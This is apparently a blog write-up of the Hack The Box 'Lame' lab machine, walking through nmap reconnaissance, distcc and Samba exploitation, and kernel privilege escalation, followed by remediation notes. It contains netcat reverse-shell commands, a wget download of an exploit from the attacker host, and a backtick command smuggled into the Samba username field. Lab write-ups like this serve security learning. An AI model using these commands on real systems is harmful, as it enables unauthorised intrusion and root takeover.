+++
draft = false
date = 2020-06-14T16:04:02+01:00
title = "Lame"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 2
+++


# Machine info

- OS : Linux
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.3


# Mind Map
![Lame_MindMap](/images/htb/lame_mindmap.png)


# Reconnaisance

First of all, let's conduct a scan in order to check what ports are open:

{{< highlight bash >}}
sudo nmap -A -T4 10.10.10.3 -n -oA ./nmap
{{< /highlight >}}
- where `-A` stands for 'Enable OS detection, version detection, script scanning, and traceroute'
- where `-T4` is for setting the timing template (available from 0 to 5)
- where `-n` stands for 'Never do DNS resolution'
- where `-oA` stands for 'Output in the three major formats at once'

Here's the scan result:

{{< highlight html >}}
Nmap scan report for 10.10.10.3
Host is up (0.31s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.18 (92%), Dell Chassis Management Controller (CMC) (92%), D-Link DIR-300 NRU router (Linux 2.6.21) (92%), Linux 2.6.16 - 2.6.21 (92%), Linux 2.6.18 - 2.6.27 (92%), Linux 2.6.21 (92%), Linux 2.6.26 (92%), Linux 2.6.8 - 2.6.30 (92%), Meinberg LANTIME M600 NTP server (Linux 2.6.15) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h57m10s, deviation: 2h49m43s, median: -3d02h57m11s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-06-12T06:29:05-04:00
| smb-security-mode:
|   account_used: blank
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   323.34 ms 10.10.14.1
2   323.88 ms 10.10.10.3

{{< /highlight >}}

**Note:** The Samba version is **3.0.20-Debian**. I'll note that down for further research of possible known exploits.

I've discovered some open ports but before moving on let's also conduct a **full port scan**, just to be sure that I do not miss nothing behind:

{{< highlight bash >}}
sudo nmap -sS -sV -p- 10.10.10.3 -n
{{< /highlight >}}

**By default nmap will only scan the top ports. To scan all the ports, I have to include the -p- switch.**

Here's the scan result:

{{< highlight html >}}
Nmap scan report for 10.10.10.3
Host is up (0.082s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
{{< /highlight >}}

I have discovered a new open port -> **3632**.

# Enumeration

At this point I can conduct a **vulnerability scan against those ports** in order to check if there are some well known vulnerabilities affecting their running services and also search for **available exploits for Samba version 3.0.20-Debian** (noted before).

### 1. Vulnerability Scan against ports 21, 22, 139, 445 and 3632

{{< highlight html >}}
3632/tcp open  distccd
| distcc-cve2004-2687:
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://distcc.github.io/security.html
|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687

{{< /highlight >}}

Great! The *distcc* service running on port 3632 seems vulnerable to **CVE-2004-2687**.

> distcc 2.x, as used in XCode 1.5 and others, when not configured to restrict access to the server port, allows remote attackers to
> execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks.

After some googling I found that nmap has a script that exploits the vulnerability: **distcc-cve2004-2687**.

### 2. Check exploits for Samba 3.0.20-Debian

Apparently, the aforementioned Samba version seems to be vulnerable to **CVE2007-2447**.
Let's see what is this exploit about:

> By sending shell metacharacters into the username we trigger the bug which in turn allows us to send arbitrary commands to the device through the username field when attempting an SMB connection. As we mentioned earlier, no authentication is required to exploit this due to the fact that the option is used to map usernames prior to authentication and thus we can exploit this whilst being unauthenticated.

**Note**: shell metacharacters are special characters that the shell interprets rather than passing to the command.

At this point It seems I have two possible ways of rooting the machine:

**1**. exploiting the *distcc* service

**2**. exploiting Samba

I'll cover both ways.

# Exploitation

### 1. distcc Service

First of all I have to launch a listener on my machine:

{{< highlight html >}}
nc -lvp 4445
listening on [any] 4445 ...
{{< /highlight >}}

Next, in another terminal window I have to launch the nmap script with its arguments:

{{< highlight html >}}
sudo nmap --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.18 4445 -e /bin/bash'" -p 3632 10.10.10.3
{{< /highlight >}}

After a few moments, I will receive back a connection on my netcat listener:

{{< highlight html >}}
10.10.10.3: inverse host lookup failed: Unknown host
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.3] 49826
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@lame:/tmp$
{{< /highlight >}}

**Note**: I have imported a python shell.


### Privilege Escalation

I am not root, so I have to figure out how to obtain full access on the machine. If I run *uname -a* I can see that the kernel version is **2.6.24**. There are different privilege escalation scripts available for this kernel version, here I'll chose this one:
https://www.exploit-db.com/exploits/8572

I download it on my machine and serve it to the target machine, where I will compile it since I know the target machine has a compiler installed:

{{< highlight html >}}
daemon@lame:/tmp$ gcc --version
gcc --version
gcc (GCC) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)
Copyright (C) 2007 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
{{< /highlight >}}

I set up a python server on my machine:

{{< highlight html >}}
sudo python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
{{< /highlight >}}

And download the file from the target:

{{< highlight html >}}
daemon@lame:/tmp$ wget http://10.10.14.18:8080/exploit.c
wget http://10.10.14.18:8080/exploit.c
--09:24:13--  http://10.10.14.18:8080/exploit.c
           => `exploit.c'
Connecting to 10.10.14.18:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,781 (2.7K) [text/plain]

100%[====================================>] 2,781         --.--K/s             

09:24:13 (339.80 MB/s) - `exploit.c' saved [2781/2781]
{{< /highlight >}}

Now I have to compile it and read the usage instructions:

{{< highlight html >}}
daemon@lame:/tmp$ gcc exploit.c -o exploit
gcc exploit.c -o exploit
{{< /highlight >}}

Instructions:

 > Pass the PID of the udevd netlink socket (listed in /proc/net/netlink,
 usually is the udevd PID minus 1) as argv[1].
 The exploit will execute /tmp/run as root so throw whatever payload you
 want in there.

 So, for the exploit to work I have to find the PID of the **udevd netlink socket** and place any payload I want under **/tmp/run** and it will be executed as root!

 To find the PID:
{{< highlight html >}}
daemon@lame:/tmp$ cat /proc/net/netlink
cat /proc/net/netlink
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
ddf0c800 0   0      00000000 0        0        00000000 2
df7a1400 4   0      00000000 0        0        00000000 2
dd30b800 7   0      00000000 0        0        00000000 2
dd826600 9   0      00000000 0        0        00000000 2
dd82e400 10  0      00000000 0        0        00000000 2
ddf0cc00 15  0      00000000 0        0        00000000 2
dcc2ba00 15  2687   00000001 0        0        00000000 2
ddf15800 16  0      00000000 0        0        00000000 2
df5dc400 18  0      00000000 0        0        00000000 2
{{< /highlight>}}

I create a reverse shell in a file called *run* under /tmp:

{{< highlight html >}}
daemon@lame:/tmp$ echo '#!/bin/bash' > run
echo '#!/bin/bash' > run
daemon@lame:/tmp$ echo 'nc -nv 10.10.14.18 4446 -e /bin/bash' >> run
echo 'nc -nv 10.10.14.18 4446 -e /bin/bash' >> run
{{< /highlight>}}

Now, before launching the exploit, I have to set up a listener on my machine:

{{< highlight html >}}
nc -nlvp 4446
listening on [any] 4446 ...
{{< /highlight >}}

I launch the exploit:

{{< highlight html >}}
daemon@lame:/tmp$ ./exploit 2687
./exploit 2687
{{< /highlight >}}

After a few seconds, I'll have a connection back on my listener. I am now root!

{{< highlight html >}}
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.3] 36182
whoami
root
python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/#
{{< /highlight >}}

**Note**: flags are under /home and /root


### 2. Samba version 3.0.20-Debian

I can also exploit this vulnerability with Metasploit, but since the process is very simple I will do it manually.

I set up a listener on my machine:

{{< highlight html >}}
nc -nlvp 4447                                                                                                                                                 
listening on [any] 4447 ...
{{< /highlight  >}}

Now I have to list the victim SMB shares - I know I can do that from the Recon phase because the message-signing is disabled - and see if I have access somewhere where to put a reverse shell:

{{< highlight html >}}
smbclient -L 10.10.10.3
Enter WORKGROUP\lafxo's password:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
{{< /highlight  >}}

To see permissions:

{{< highlight html >}}
sudo smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
{{< /highlight  >}}

I have **WRITE permissions on tmp**, so let's access it and see If I can put here my reverse shell:

{{< highlight html >}}
smbclient \\\\10.10.10.3\\tmp
Enter WORKGROUP\lafxo's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "/=`nohup nc -nv 10.10.14.18 4447 -e /bin/sh`"
Password:
{{< /highlight  >}}

After a few seconds, I receive the reverse shell on my listener, and I can see I'm already root!

{{< highlight html >}}
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.3]
39442                                                                                                                    
whoami
root
{{< /highlight >}}



## Lessons learned and remediations

- Whenever possible run a full port scan. With the default port scan it was impossible to identify the port 3632, which leaded to exploitation!
- The machine was exploited thanks to publicly available exploits. So always update the software!
- Restrict access to the server by disabling WRITE access where not necessary, as it could easily become a way for exploitation.
